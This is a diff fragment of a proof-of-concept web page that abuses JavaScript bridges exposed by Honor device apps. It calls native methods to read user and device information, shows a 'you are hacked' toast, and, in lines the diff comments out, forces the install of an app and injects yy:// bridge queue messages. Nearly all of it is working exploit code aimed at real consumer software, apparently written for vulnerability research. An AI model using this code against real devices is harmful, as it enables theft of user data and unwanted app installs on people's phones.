@@ -28,29 +28,29 @@
     "showToast": "you are hacked",
      "isRefresh": true
   });
-     window.Native.nativeMethod("com.hihonor.hm.h5.container.js.method.DeviceMethods", "getAppDeviceInfo", test_Json, "3", "MyCallback");
-       window.Native.nativeMethod("com.hihonor.quickgamecenter.h5.method.JSMethodImpl", "getUserInfo", test_Json, "3", "MyCallback"); 
-    //window.Native.nativeMethod("com.hihonor.hm.h5.container.js.method.DeviceMethods", "getAppDeviceInfo", test_Json, "1", "MyCallback");
-window.Native.nativeMethod("com.hihonor.gamecenter.bu_h5.manager.JSMethodImp", "getUserInfo", test_Json, "3", "MyCallback"); 
-
+//      window.Native.nativeMethod("com.hihonor.hm.h5.container.js.method.DeviceMethods", "getAppDeviceInfo", test_Json, "3", "MyCallback");
+//        window.Native.nativeMethod("com.hihonor.quickgamecenter.h5.method.JSMethodImpl", "getUserInfo", test_Json, "3", "MyCallback"); 
+//     //window.Native.nativeMethod("com.hihonor.hm.h5.container.js.method.DeviceMethods", "getAppDeviceInfo", test_Json, "1", "MyCallback");
+// window.Native.nativeMethod("com.hihonor.gamecenter.bu_h5.manager.JSMethodImp", "getUserInfo", test_Json, "3", "MyCallback"); 
+window.Native.nativeMethod("", "getUserInfo", "{}", "1", "MyCallback");
         
-    var honorBridgeCallback = function(p1){
-        alert(JSON.stringify(p1));
-    }
+    // var honorBridgeCallback = function(p1){
+    //     alert(JSON.stringify(p1));
+    // }
 
-    var install=function (){
+    // var install=function (){
 
-        Native.nativeMethod('com.hihonor.gamecenter.bu_h5.manager.AppOperateImp','downloadButtonOnClick','{"packageName":"com.outfit7.mytalkingtomfree","trackingParameter":"gm00202|v=3|pg=HTY_BA68CJ68QWVE53EAGJBU13yxfly|ssd=H2|pos=2|reqId=ca17dc88967e4a27b1d17c51fc6d9d31|impId=Bb46","externalJson":"","showToast":"1"}','_downloadButtonOnClick_AU_7dox6TT','honorBridgeCallback');
-    };
-    setTimeout(install,500);
+    //     Native.nativeMethod('com.hihonor.gamecenter.bu_h5.manager.AppOperateImp','downloadButtonOnClick','{"packageName":"com.outfit7.mytalkingtomfree","trackingParameter":"gm00202|v=3|pg=HTY_BA68CJ68QWVE53EAGJBU13yxfly|ssd=H2|pos=2|reqId=ca17dc88967e4a27b1d17c51fc6d9d31|impId=Bb46","externalJson":"","showToast":"1"}','_downloadButtonOnClick_AU_7dox6TT','honorBridgeCallback');
+    // };
+    // setTimeout(install,500);
 
 
-    var test=function (){
+    // var test=function (){
 
-        window.location.href='yy://return/_fetchQueue/[{"handlerName":"queryAppInformation","data":{"pkgNameList":[com.outfit7.mytalkingtomfree","com.outfit7.mytalkingtomfree"],"callbackId":"2316774"},"callbackId":"cb_2_1728743559783"}]';
-    };
-    setTimeout(test,100);
-    window.location.href='yy://__QUEUE_MESSAGE__/';
+    //     window.location.href='yy://return/_fetchQueue/[{"handlerName":"queryAppInformation","data":{"pkgNameList":[com.outfit7.mytalkingtomfree","com.outfit7.mytalkingtomfree"],"callbackId":"2316774"},"callbackId":"cb_2_1728743559783"}]';
+    // };
+    // setTimeout(test,100);
+    // window.location.href='yy://__QUEUE_MESSAGE__/';
 
 
             
